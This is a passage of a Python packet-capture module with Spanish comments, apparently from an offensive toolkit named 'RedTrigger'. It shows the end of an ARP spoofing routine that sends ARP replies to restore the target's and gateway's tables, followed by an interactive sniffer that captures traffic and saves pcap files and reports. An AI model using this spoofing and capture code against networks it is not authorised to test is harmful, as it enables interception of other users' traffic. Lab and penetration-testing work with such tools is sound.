        restore_gateway = Ether()/ARP(
            op=2,
            psrc=target_ip,
            pdst=gateway_ip,
            hwdst=gateway_mac,
            hwsrc=target_mac
        )
        
        # Enviar paquetes de restauración varias veces
        for _ in range(5):
            scapy.sendp(restore_target, iface=interface, verbose=0)
            scapy.sendp(restore_gateway, iface=interface, verbose=0)
            time.sleep(0.2)
        
        logger.info("ARP spoofing finalizado y tablas ARP restauradas")
        return True
    except Exception as e:
        logger.error(f"Error en ARP spoofing: {str(e)}")
        return False

# Función principal para pruebas
def main():
    print(f"{COLORS['HEADER']}Módulo de captura y análisis de paquetes para RedTrigger{COLORS['ENDC']}")
    
    if not SCAPY_AVAILABLE:
        print(f"{COLORS['FAIL']}Error: Scapy no está instalado. Instale scapy con: pip install scapy{COLORS['ENDC']}")
        return
    
    # Obtener interfaces disponibles
    interfaces = get_network_interfaces()
    if not interfaces:
        print(f"{COLORS['FAIL']}No se encontraron interfaces de red{COLORS['ENDC']}")
        return
    
    # Mostrar interfaces disponibles
    print(f"\n{COLORS['BLUE']}Interfaces disponibles:{COLORS['ENDC']}")
    for i, iface in enumerate(interfaces):
        ip = get_interface_ip(iface) or "N/A"
        mac = get_interface_mac(iface) or "N/A"
        print(f"  {i+1}. {iface} - IP: {ip}, MAC: {mac}")
    
    # Seleccionar interfaz
    selected = input(f"\n{COLORS['BOLD']}Seleccione una interfaz (número): {COLORS['ENDC']}")
    try:
        index = int(selected) - 1
        if 0 <= index < len(interfaces):
            interface = interfaces[index]
        else:
            print(f"{COLORS['WARNING']}Selección inválida, usando la primera interfaz{COLORS['ENDC']}")
            interface = interfaces[0]
    except:
        print(f"{COLORS['WARNING']}Entrada inválida, usando la primera interfaz{COLORS['ENDC']}")
        interface = interfaces[0]
    
    # Configurar captura
    filter_expr = input(f"{COLORS['BOLD']}Filtro de captura (opcional): {COLORS['ENDC']}") or None
    count = input(f"{COLORS['BOLD']}Número de paquetes a capturar (0 = sin límite): {COLORS['ENDC']}") or "0"
    timeout = input(f"{COLORS['BOLD']}Timeout en segundos (0 = sin límite): {COLORS['ENDC']}") or "0"
    
    try:
        count = int(count)
        timeout = int(timeout)
    except:
        print(f"{COLORS['WARNING']}Valores inválidos, usando valores por defecto{COLORS['ENDC']}")
        count = 0
        timeout = 0
    
    # Crear capturador
    capture = PacketCapture({
        'interface': interface,
        'filter': filter_expr,
        'packet_count': count,
        'timeout': timeout,
        'verbose': True,
        'store_packets': True
    })
    
    # Iniciar captura
    print(f"\n{COLORS['GREEN']}Iniciando captura en {interface}...{COLORS['ENDC']}")
    print("Presione Ctrl+C para detener la captura")
    
    capture.start_capture()
    
    try:
        # Esperar a que termine la captura
        while not capture.stop_capture:
            time.sleep(0.1)
    except KeyboardInterrupt:
        print("\nDeteniendo captura...")
        capture.stop()
    
    # Mostrar estadísticas
    capture.print_stats()
    
    # Preguntar si se desea guardar la captura
    save = input(f"\n{COLORS['BOLD']}¿Desea guardar la captura? (s/n): {COLORS['ENDC']}").lower()
    if save.startswith('s'):
        filename = input(f"{COLORS['BOLD']}Nombre del archivo (o Enter para nombre automático): {COLORS['ENDC']}") or None
        capture.save_pcap(filename)
    
    # Preguntar si se desea generar un informe
    report = input(f"\n{COLORS['BOLD']}¿Desea generar un informe? (s/n): {COLORS['ENDC']}").lower()
    if report.startswith('s'):
        filename = input(f"{COLORS['BOLD']}Nombre del archivo (o Enter para nombre automático): {COLORS['ENDC']}") or None
        capture.generate_report(filename)

if __name__ == '__main__':
    main()